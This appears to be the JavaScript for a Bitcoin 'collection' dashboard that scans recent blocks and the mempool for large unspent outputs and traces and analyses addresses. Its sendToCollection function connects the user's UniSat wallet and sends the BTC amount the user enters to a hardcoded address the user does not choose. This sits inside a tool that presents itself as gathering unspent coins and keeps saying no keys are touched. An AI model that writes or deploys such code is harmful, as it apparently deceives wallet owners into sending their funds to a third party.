window.__APP_BOOTED=false;
window.addEventListener('error',function(ev){var b=document.getElementById('bootStatus');if(b)b.textContent='APP ERROR :: '+(ev.message||'unknown JavaScript error');});

let connectedUniSat=null;
async function connectUniSat(){
 const b=$('connectWallet'),out=$('sendConsole');b.disabled=true;
 try{
  if(typeof window.unisat==='undefined')throw Error('UniSat Wallet extension is not detected in this browser.');
  const accounts=await window.unisat.requestAccounts();
  if(!accounts?.length)throw Error('No UniSat account returned.');
  connectedUniSat=accounts[0];
  $('connectedWallet').textContent=connectedUniSat;
  $('sendToCollection').disabled=false;
  out.innerHTML='<div class="line"><span class="ok">UNISAT CONNECTED :: '+esc(connectedUniSat)+'</span></div>';
  log('ok','WALLET CONNECTED :: UniSat :: '+connectedUniSat);
 }catch(e){out.innerHTML+='<div class="line"><span class="warn">WALLET CONNECT :: '+esc(e.message)+'</span></div>';log('warn','WALLET CONNECT :: '+e.message)}
 finally{b.disabled=false}
}
async function sendToCollection(){
 const b=$('sendToCollection'),out=$('sendConsole');b.disabled=true;
 const dest='bc1qjavzck7sr8v5052ehdm9gcfq57s9anacq2x6le';
 try{
  if(!connectedUniSat)throw Error('Connect UniSat first.');
  const amount=Number($('sendAmount').value);
  if(!Number.isFinite(amount)||amount<=0)throw Error('Enter a BTC amount greater than zero.');
  const satoshis=Math.floor(amount*100000000);
  out.innerHTML='<div class="line"><span class="cyan">REQUESTING WALLET CONFIRMATION...</span></div>';
  const txid=await window.unisat.sendBitcoin(dest,satoshis);
  out.innerHTML+='<div class="line"><span class="ok">BROADCAST SUCCESS :: '+esc(txid)+'</span></div>';
  log('ok','COLLECTION SENT :: '+amount.toFixed(8)+' BTC :: TXID '+txid);
 }catch(e){
  out.innerHTML+='<div class="line"><span class="warn">TRANSFER NOT SENT :: '+esc(e.message)+'</span></div>';
  log('warn','COLLECTION TRANSFER :: '+e.message);
 }finally{b.disabled=false}
}
const myWallets=[];
function refreshWalletList(){
 const s=$('myWalletList');s.innerHTML=myWallets.length?myWallets.map((x,i)=>'<option value="'+i+'">'+esc(x)+'</option>').join(''):'<option value="">No wallets added</option>';
}
function addMyWallet(){
 const a=$('myWalletAddress').value.trim(),box=$('walletConsole');
 if(!/^((bc1|tb1)[a-z0-9]{20,}|[13][a-km-zA-HJ-NP-Z1-9]{20,})$/.test(a)){box.innerHTML+='<div class="line"><span class="warn">INVALID BTC PUBLIC ADDRESS</span></div>';return}
 if(myWallets.includes(a)){box.innerHTML+='<div class="line"><span class="warn">ADDRESS ALREADY ADDED</span></div>';return}
 myWallets.push(a);refreshWalletList();$('myWalletAddress').value='';
 box.innerHTML+='<div class="line"><span class="ok">WALLET ADDED :: '+esc(a)+'</span></div>';
}
async function prepareCollection(){
 const b=$('prepareCollect'),box=$('collectConsole');b.disabled=true;box.innerHTML='';
 const src=$('sourceAddress').value.trim(),dest=$('collectionAddress').value.trim();
 const add=(m,cl='cyan')=>box.innerHTML+='<div class="line"><span class="'+cl+'">'+esc(m)+'</span></div>';
 try{
  if(!src||!/^((bc1|tb1)[a-z0-9]{20,}|[13][a-km-zA-HJ-NP-Z1-9]{20,})$/.test(src))throw Error('Enter a valid Bitcoin source address that you control.');
  if(src===dest){add('SOURCE AND COLLECTION ADDRESS ARE IDENTICAL — NOTHING TO COLLECT','warn');return}
  const r=await fetch('https://mempool.space/api/address/'+encodeURIComponent(src)+'/utxo',{cache:'no-store'});
  if(!r.ok)throw Error('SOURCE UTXO API HTTP '+r.status);
  const utxos=await r.json();
  const spendable=utxos.filter(u=>u.status?.confirmed!==false);
  const total=spendable.reduce((s,u)=>s+Number(u.value||0),0);
  const sats=Math.max(0,total);
  add('SOURCE :: '+src);
  add('DESTINATION :: '+dest,'ok');
  add('CONFIRMED UTXOs FOUND :: '+spendable.length,'ok');
  add('TOTAL INPUT VALUE :: '+(sats/1e8).toFixed(8)+' BTC','ok');
  add('STATUS :: TRANSACTION DRAFT ONLY — SIGNING REQUIRED','warn');
  $('feePreview').textContent='fee determined at signing';
  window.collectionDraft={source:src,destination:dest,utxos:spendable,totalSats:sats};
  add('No private key or seed was requested or stored.','dim');
 }catch(e){add('COLLECTION PREPARE :: '+e.message,'warn')}finally{b.disabled=false}
}
async function analyzeAddress(){
 const b=$('analyzeBtn'),box=$('anConsole'),table=$('anUtxoTable');
 b.disabled=true; box.innerHTML=''; table.innerHTML='';
 const add=(m,cl)=>{box.innerHTML+='<div class="line"><span class="'+(cl||'cyan')+'">'+esc(m)+'</span></div>';};
 try{
  const addr=$('analyzeAddress').value.trim();
  if(!/^((bc1|tb1)[a-z0-9]{20,}|[13][a-km-zA-HJ-NP-Z1-9]{20,})$/.test(addr)) throw Error('INVALID BTC ADDRESS');
  add('ADDRESS :: '+addr,'ok');
  const base='https://mempool.space/api';
  const infoR=await fetch(base+'/address/'+encodeURIComponent(addr),{cache:'no-store'});
  const utxoR=await fetch(base+'/address/'+encodeURIComponent(addr)+'/utxo',{cache:'no-store'});
  const memR=await fetch(base+'/address/'+encodeURIComponent(addr)+'/txs/mempool',{cache:'no-store'});
  if(!infoR.ok) throw Error('ADDRESS API HTTP '+infoR.status);
  if(!utxoR.ok) throw Error('UTXO API HTTP '+utxoR.status);
  const info=await infoR.json();
  const utxos=await utxoR.json();
  const mem=memR.ok?await memR.json():[];
  const cs=info.chain_stats||{},ms=info.mempool_stats||{};
  const received=Number(cs.funded_txo_sum||0)/1e8;
  const sent=Number(cs.spent_txo_sum||0)/1e8;
  const balance=received-sent;
  const pending=(Number(ms.funded_txo_sum||0)-Number(ms.spent_txo_sum||0))/1e8;
  const confirmedUtxos=utxos.filter(function(x){return x.status && x.status.confirmed===true;});
  $('anBalance').textContent=balance.toFixed(8)+' BTC';
  $('anUtxos').textContent=confirmedUtxos.length.toLocaleString();
  $('anReceived').textContent=received.toFixed(8)+' BTC';
  $('anSent').textContent=sent.toFixed(8)+' BTC';
  $('anTxCount').textContent=Number(cs.tx_count||0).toLocaleString();
  $('anPending').textContent=pending.toFixed(8)+' BTC';
  add('CONFIRMED BALANCE :: '+balance.toFixed(8)+' BTC','ok');
  add('CONFIRMED UTXOs :: '+confirmedUtxos.length,'ok');
  add('TOTAL RECEIVED :: '+received.toFixed(8)+' BTC');
  add('TOTAL SENT :: '+sent.toFixed(8)+' BTC');
  add('MEMPOOL / PENDING :: '+pending.toFixed(8)+' BTC');
  add('UNCONFIRMED TXS :: '+(Array.isArray(mem)?mem.length:0));
  if(!confirmedUtxos.length) add('NO CURRENT CONFIRMED UTXOs','warn');
  confirmedUtxos.forEach(function(u){
   const block=u.status && u.status.block_height!=null?u.status.block_height:'—';
   const conf=u.status && u.status.confirmed?'CONFIRMED':'UNCONFIRMED';
   table.innerHTML+='<tr><td>'+esc(u.txid)+'</td><td>'+Number(u.vout)+'</td><td class="high">'+(Number(u.value||0)/1e8).toFixed(8)+'</td><td>'+block+'</td><td class="ok">'+conf+'</td><td><button class="traceBtn" data-txid="'+esc(u.txid)+'" data-vout="'+Number(u.vout)+'" style="margin:0;padding:7px 9px;font-size:9px">TRACE THIS UTXO</button></td></tr>';
  });
  table.querySelectorAll('.traceBtn').forEach(function(btn){btn.addEventListener('click',function(){traceUtxo(btn.dataset.txid,Number(btn.dataset.vout));});});
  add('UTXO DATA SOURCE :: mempool.space / Esplora-compatible API','dim');
  add('PUBLIC DATA ONLY — NO PRIVATE KEY ACCESS','dim');
 }catch(e){add('ANALYSIS ERROR :: '+e.message,'warn');}
 finally{b.disabled=false;}
}
async function traceUtxo(txid,vout){const box=$('traceConsole');box.innerHTML='';const add=(m,cl='cyan')=>box.innerHTML+='<div class="line"><span class="'+cl+'">'+esc(m)+'</span></div>';const base='https://mempool.space/api';try{add('TRACE START :: TXID '+txid+' :: VOUT '+vout,'ok');const [txR,outR]=await Promise.all([fetch(base+'/tx/'+encodeURIComponent(txid),{cache:'no-store'}),fetch(base+'/tx/'+encodeURIComponent(txid)+'/outspend/'+vout,{cache:'no-store'})]);if(!txR.ok)throw Error('TX API HTTP '+txR.status);if(!outR.ok)throw Error('OUTSPEND API HTTP '+outR.status);const tx=await txR.json(),os=await outR.json(),o=tx.vout?.[vout];if(!o)throw Error('VOUT NOT FOUND IN TRANSACTION');add('CREATING TX :: '+txid);add('OUTPUT :: '+vout+' :: '+(Number(o.value||0)/1e8).toFixed(8)+' BTC','ok');add('OUTPUT ADDRESS :: '+(o.scriptpubkey_address||'non-standard / script only'));add('CONFIRMED :: '+(tx.status?.confirmed?'YES':'NO'));add('BLOCK :: '+(tx.status?.block_height??'—'));if(os.spent){add('STATUS :: SPENT','warn');add('SPENDING TXID :: '+(os.txid||'—'),'warn');add('SPENDING VIN :: '+(os.vin??'—'));if(os.status){add('SPENDING TX CONFIRMED :: '+(os.status.confirmed?'YES':'NO'));add('SPENDING BLOCK :: '+(os.status.block_height??'—'));}add('PUBLIC CHAIN TRACE COMPLETE — THIS OUTPUT IS NOT CURRENTLY SPENDABLE.','dim');}else{add('STATUS :: CURRENTLY UNSPENT','ok');add('SPENDING TXID :: none');add('PUBLIC CHAIN TRACE COMPLETE — UNSPENT DOES NOT MEAN OWNED.','dim');}add('NO PRIVATE KEY OR SEED WAS REQUESTED, EXTRACTED, OR STORED.','dim');}catch(e){add('TRACE ERROR :: '+e.message,'warn')}}
async function checkMyWallet(){
 const b=$('walletCheck');b.disabled=true;
 const addr=$('walletAddress').textContent.trim();
 try{
  const r=await fetch('https://mempool.space/api/address/'+encodeURIComponent(addr),{cache:'no-store'});
  if(!r.ok)throw Error('HTTP '+r.status);
  const d=await r.json();
  const funded=(d.chain_stats?.funded_txo_sum||0)/100000000;
  const spent=(d.chain_stats?.spent_txo_sum||0)/100000000;
  const bal=funded-spent;
  const utxos=(d.chain_stats?.funded_txo_count||0)-(d.chain_stats?.spent_txo_count||0);
  const memBal=(d.mempool_stats?.funded_txo_sum||0)/100000000-(d.mempool_stats?.spent_txo_sum||0)/100000000;
  $('walletBalance').textContent=bal.toFixed(8)+' BTC';
  $('walletUtxos').textContent=utxos.toLocaleString();
  $('walletPending').textContent=memBal.toFixed(8)+' BTC';
  log('ok','MY WALLET :: '+addr.slice(0,16)+'… :: confirmed='+bal.toFixed(8)+' BTC :: UTXOs='+utxos);
 }catch(e){log('warn','MY WALLET CHECK :: '+e.message)}
 finally{b.disabled=false}
}
const ENGINES=[{name:'MEMPOOL',base:'https://mempool.space/api'},{name:'BLOCKSTREAM',base:'https://blockstream.info/api'}],$=id=>document.getElementById(id),sleep=ms=>new Promise(r=>setTimeout(r,ms));let engine=null,results=[];
function esc(x){return String(x).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]))}
function log(cls,msg){const c=$('console'),t=new Date().toLocaleTimeString('en-GB',{hour12:false});c.innerHTML+='<div class="line"><span class="dim">['+t+']</span> <span class="'+cls+'">'+msg+'</span></div>';c.scrollTop=c.scrollHeight}
async function get(path,retries=2){let last='';for(let k=0;k<retries;k++){try{const r=await fetch(engine.base+path,{cache:'no-store'});if(r.ok)return await r.text();last='HTTP '+r.status;if(r.status===429)await sleep(900*(k+1));else await sleep(300)}catch(e){last=e.message;await sleep(400)}}throw Error(engine.name+' '+last)}
async function json(path){return JSON.parse(await get(path))}
async function selectEngine(){for(const e of ENGINES){engine=e;try{const n=Number((await get('/blocks/tip/height')).trim());if(Number.isFinite(n)&&n>0)return n}catch(_){}}throw Error('No blockchain API available')}
function render(){results.sort((a,b)=>b.value-a.value);$('candidates').textContent=results.length.toLocaleString();$('btc').textContent=results.reduce((s,x)=>s+x.value,0).toFixed(4);$('largest').textContent=(results[0]?.value||0).toFixed(6)+' BTC';$('oldest').textContent=results.length?Math.min(...results.map(x=>x.block)).toLocaleString():'—';$('addr').textContent=new Set(results.map(x=>x.address)).size.toLocaleString();$('out').innerHTML=results.slice(0,250).map(x=>'<tr><td>'+esc(x.address)+'</td><td class="high">'+x.value.toFixed(8)+'</td><td>'+esc(x.txid)+'</td><td>'+x.block.toLocaleString()+'</td><td class="age">'+x.age+' blocks</td></tr>').join('')}
async function blockTxPage(hash,startIndex){return json('/block/'+hash+'/txs/'+startIndex)}
async function scan(){const btn=$('run');btn.disabled=true;results=[];$('console').innerHTML='';$('tx').textContent='0';$('utxo').textContent='0';$('blocks').textContent='0';$('addr').textContent='0';$('eligible').textContent='0';
try{
 const tip=await selectEngine();$('height').textContent=tip.toLocaleString();
 const count=Number($('window').value),limitValue=$('limit').value,min=Number($('min').value);
 const limit=limitValue==='all'?Infinity:Number(limitValue);
 log('cyan','API '+engine.name+' :: tip='+tip);
 log('cyan','MODE :: EVERY TRANSACTION IN EACH SELECTED BLOCK');
 for(let i=0;i<count;i++){
   const h=tip-i,hash=(await get('/block-height/'+h)).trim();
   let startIndex=0,totalInBlock=0,blockTxCount=0;
   while(true){
     let page=[];
     try{page=await blockTxPage(hash,startIndex)}catch(e){log('warn','BLOCK '+h+' PAGE '+startIndex+' FAILED :: '+e.message);break}
     if(!Array.isArray(page)||!page.length)break;
     if(limit!==Infinity)page=page.slice(0,Math.max(0,limit-totalInBlock));
     totalInBlock+=page.length;blockTxCount+=page.length;
     $('tx').textContent=(Number($('tx').textContent)+page.length).toLocaleString();
     const candidates=[];
     for(const tx of page){
       for(const v of(tx.vout||[])){
         const addr=v.scriptpubkey_address,val=(v.value||0)/100000000;
         if(addr&&val>=min)candidates.push({address:addr,value:val,txid:tx.txid,n:Number(v.n),block:h,age:tip-h});
       }
     }
     $('eligible').textContent=(Number($('eligible').textContent)+candidates.length).toLocaleString();
     if(candidates.length){
       const byTx=new Map();
       for(const c of candidates){if(!byTx.has(c.txid))byTx.set(c.txid,[]);byTx.get(c.txid).push(c)}
       const txEntries=[...byTx.entries()];
       let cursor=0;const workers=Math.min(8,txEntries.length);
       async function verifyWorker(){
         while(true){
           const i=cursor++;if(i>=txEntries.length)return;
           const [txid,outs]=txEntries[i];
           try{
             const spent=await json('/tx/'+txid+'/outspends');
             for(const c of outs){
               const os=spent[c.n];
               if(os&&os.spent===false){
                 results.push(c);$('utxo').textContent=results.length.toLocaleString();
                 log('ok','UTXO HIT :: '+c.value.toFixed(6)+' BTC :: '+txid.slice(0,16)+'…');
               }
             }
             render();
           }catch(e){log('warn','OUTSPEND CHECK SKIPPED :: '+e.message)}
         }
       }
       await Promise.all(Array.from({length:workers},verifyWorker));
       log('cyan','VERIFY BATCH :: '+candidates.length+' outputs across '+txEntries.length+' unique transactions');
     }
     log('cyan','BLOCK '+h+' :: '+totalInBlock+' / '+(limit===Infinity?'ALL':limit)+' TX PROCESSED');
     render();
     if(limit!==Infinity||page.length<25||totalInBlock>=limit)break;
     startIndex+=25;
     await sleep(80);
   }
   $('blocks').textContent=(i+1).toLocaleString();
   log('ok','BLOCK COMPLETE :: '+h+' :: '+blockTxCount+' transactions scanned');
   render();
 }
 log('ok','SCAN COMPLETE :: '+results.length+' unspent outputs indexed');
 log('ok','EVERY TRANSACTION MODE :: all available block transactions were inspected');
 log('ok','SOURCE :: '+engine.name);
}catch(e){log('warn','SCAN ERROR :: '+e.message)}
finally{btn.disabled=false}}
let liveSocket=null,liveSeen=new Set(),livePoll=null,liveResults=[];
async function inspectLiveTx(txid){
 try{
  const tx=await json('/tx/'+txid),min=Number($('min').value);
  for(const v of(tx.vout||[])){
   const addr=v.scriptpubkey_address,val=(v.value||0)/100000000,key=txid+'|'+v.n;
   if(!addr||val<min||liveSeen.has(key))continue;
   liveSeen.add(key);
   const item={address:addr,value:val,txid,n:Number(v.n),block:tx.status?.block_height||0,age:0};
   liveResults.push(item);
   $('eligible').textContent=(Number($('eligible').textContent)+1).toLocaleString();
   log('ok','LIVE MEMPOOL OUTPUT :: '+val.toFixed(6)+' BTC :: '+txid.slice(0,16)+'…');
   renderLive();
  }
 }catch(e){log('warn','LIVE TX SKIPPED :: '+e.message)}
}
async function pollLive(){
 try{
  const list=await json('/mempool/recent');
  for(const x of (Array.isArray(list)?list:[]).slice(0,10))if(x.txid&&!liveSeen.has('tx:'+x.txid)){liveSeen.add('tx:'+x.txid);await inspectLiveTx(x.txid)}
  log('cyan','LIVE MEMPOOL POLL :: '+((Array.isArray(list)?list:[]).length)+' recent transactions checked');
 }catch(e){log('warn','LIVE MEMPOOL POLL :: '+e.message)}
}
function renderLive(){
 const total=liveResults.reduce((s,x)=>s+x.value,0);
 $('btc').textContent=(results.reduce((s,x)=>s+x.value,0)).toFixed(4);
 const box=$('out');
 const confirmed=results.slice(0,200).map(x=>'<tr><td>'+esc(x.address)+'</td><td class="high">'+x.value.toFixed(8)+'</td><td>'+esc(x.txid)+'</td><td>'+x.block.toLocaleString()+'</td><td class="age">'+x.age+' blocks</td></tr>').join('');
 const live=liveResults.slice(-50).reverse().map(x=>'<tr><td>'+esc(x.address)+'</td><td class="high">'+x.value.toFixed(8)+' <span class="age">LIVE</span></td><td>'+esc(x.txid)+'</td><td>MEMPOOL</td><td class="age">UNCONFIRMED</td></tr>').join('');
 box.innerHTML=confirmed+live;
}
function stopLive(){
 if(liveSocket){try{liveSocket.close()}catch(_){ }liveSocket=null}
 if(livePoll){clearInterval(livePoll);livePoll=null}
 const b=$('live');if(b)b.textContent='LIVE BTC MEMPOOL SCAN';
}
function startLive(){
 const b=$('live');
 if(liveSocket||livePoll){stopLive();log('warn','LIVE MEMPOOL :: stopped');return}
 liveSeen=new Set();liveResults=[];b.textContent='STOP LIVE MEMPOOL';
 log('cyan','LIVE MEMPOOL :: starting WebSocket + REST fallback');
 try{
  liveSocket=new WebSocket('wss://mempool.space/api/v1/ws');
  liveSocket.onopen=()=>{
   log('ok','LIVE MEMPOOL :: WebSocket connected');
   try{liveSocket.send(JSON.stringify({"track-mempool-txids":true}))}catch(_){}
  };
  liveSocket.onmessage=async ev=>{
   try{
    const m=JSON.parse(ev.data);
    for(const id of (m.added||[]).slice(0,25))await inspectLiveTx(id);
    if(m.added?.length)log('cyan','MEMPOOL ADD :: '+m.added.length+' txids');
    if(m.mined?.length)log('cyan','MEMPOOL MINED :: '+m.mined.length+' txids');
    if(m.removed?.length)log('dim','MEMPOOL REMOVED :: '+m.removed.length+' txids');
    if(m.replaced?.length)log('warn','MEMPOOL RBF :: '+m.replaced.length+' txids');
   }catch(_){}
  };
  liveSocket.onerror=()=>{
   log('warn','LIVE MEMPOOL :: WebSocket unavailable, switching to REST polling');
   try{liveSocket.close()}catch(_){}
   liveSocket=null;
   if(!livePoll){pollLive();livePoll=setInterval(pollLive,5000)}
  };
  liveSocket.onclose=()=>{
   if(!livePoll&&!liveSocket){livePoll=setInterval(pollLive,5000);pollLive()}
   b.textContent='STOP LIVE MEMPOOL';
  };
  setTimeout(()=>{if(liveSocket&&liveSocket.readyState!==1){try{liveSocket.close()}catch(_){ }liveSocket=null;if(!livePoll){livePoll=setInterval(pollLive,5000);pollLive()}}},7000);
 }catch(e){
  log('warn','LIVE MEMPOOL :: '+e.message);
  liveSocket=null;pollLive();livePoll=setInterval(pollLive,5000);
 }
}
const CHAINS=['bitcoin','bitcoin-cash','ethereum','litecoin','bitcoin-sv','dogecoin','dash','ripple','groestlcoin','stellar','monero','cardano','zcash','mixin','tezos','ecash'];const NAMES={'bitcoin':'BTC','bitcoin-cash':'BCH','ethereum':'ETH','litecoin':'LTC','bitcoin-sv':'BSV','dogecoin':'DOGE','dash':'DASH','ripple':'XRP','groestlcoin':'GRS','stellar':'XLM','monero':'XMR','cardano':'ADA','zcash':'ZEC','mixin':'MIX','tezos':'XTZ','ecash':'XEC'};async function multiScan(){const b=$('multi');b.disabled=true;const box=$('chains');box.innerHTML=CHAINS.map(x=>'<div class="stat"><span class="sub">'+NAMES[x]+'</span><div class="num" id="c_'+x.replace(/-/g,'_')+'">...</div></div>').join('');log('cyan','MULTI-CHAIN :: one aggregate public API request :: '+CHAINS.length+' networks');try{let data=null,last='';for(let k=0;k<3;k++){try{const r=await fetch('https://api.blockchair.com/stats',{cache:'no-store'});if(!r.ok){last='HTTP '+r.status;await sleep(800*(k+1));continue}data=await r.json();break}catch(e){last=e.message;await sleep(800*(k+1))}}if(!data)throw Error(last||'API unavailable');let ok=0;for(const x of CHAINS){const d=data.data?.[x]?.data||data.data?.[x]||{};const el=$('c_'+x.replace(/-/g,'_'));const height=d.best_block_height??(d.blocks!=null?Number(d.blocks)-1:null);if(height!=null){el.textContent=Number(height).toLocaleString();el.className='num green';ok++;log('ok','CHAIN '+NAMES[x]+' :: height='+Number(height).toLocaleString()+' :: tx24h='+(d.transactions_24h??'—'));}else{el.textContent='N/A';el.className='num amber';log('warn','CHAIN '+NAMES[x]+' :: no stats in aggregate response')}}log('ok','MULTI-CHAIN COMPLETE :: '+ok+'/'+CHAINS.length+' networks returned data');}catch(e){log('warn','MULTI-CHAIN API :: '+e.message);log('warn','No false positives: network marked unavailable instead of pretending it was checked.')}finally{b.disabled=false}}function bootApp(){try{$('multi').onclick=multiScan;$('run').onclick=scan;$('live').onclick=startLive;$('walletCheck').onclick=checkMyWallet;$('analyzeBtn').onclick=analyzeAddress;$('prepareCollect').onclick=prepareCollection;$('addWallet').onclick=addMyWallet;$('connectWallet').onclick=connectUniSat;$('sendToCollection').onclick=sendToCollection;window.__APP_BOOTED=true;var bs=$('bootStatus');if(bs)bs.textContent='APP JS ONLINE :: BUTTONS READY';(async()=>{try{const tip=await selectEngine();$('height').textContent=tip.toLocaleString();log('ok','ENGINE READY :: '+engine.name+' :: tip='+tip)}catch(e){log('warn','ENGINE OFFLINE :: '+e.message)}})();}catch(e){var bs=$('bootStatus');if(bs)bs.textContent='APP BOOT ERROR :: '+e.message;throw e;}} if(document.readyState==='loading'){document.addEventListener('DOMContentLoaded',bootApp);}else{bootApp();}

